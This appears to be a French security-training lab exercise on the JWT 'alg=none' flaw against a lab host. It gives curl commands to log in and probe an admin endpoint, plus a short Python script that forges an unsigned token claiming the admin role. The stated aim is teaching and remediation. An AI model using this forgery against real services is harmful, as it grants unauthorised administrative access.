# J3-C04 — JWT alg=none

## Objectif
Comprendre qu’un JWT sans signature ne doit jamais être accepté.

## Obtenir un JWT
```bash
export TOKEN=$(curl -s -X POST http://authapi.target.local:5001/jwt-login \
  -d "username=alice&password=alice123" | jq -r .token)
```

## Tester admin
```bash
curl -H "Authorization: Bearer $TOKEN" http://authapi.target.local:5001/api/jwt/admin | jq
```

## Créer un token alg=none
```bash
python3 - << 'PY'
import base64, json
def b64url(data):
    return base64.urlsafe_b64encode(json.dumps(data,separators=(",",":")).encode()).rstrip(b"=").decode()
header={"typ":"JWT","alg":"none"}
payload={"sub":"1","username":"alice","role":"admin","iat":1234567890}
print(b64url(header)+"."+b64url(payload)+".")
PY
```

## Preuve attendue
Token original décodé, accès admin refusé puis accepté avec `alg=none`, remédiation.
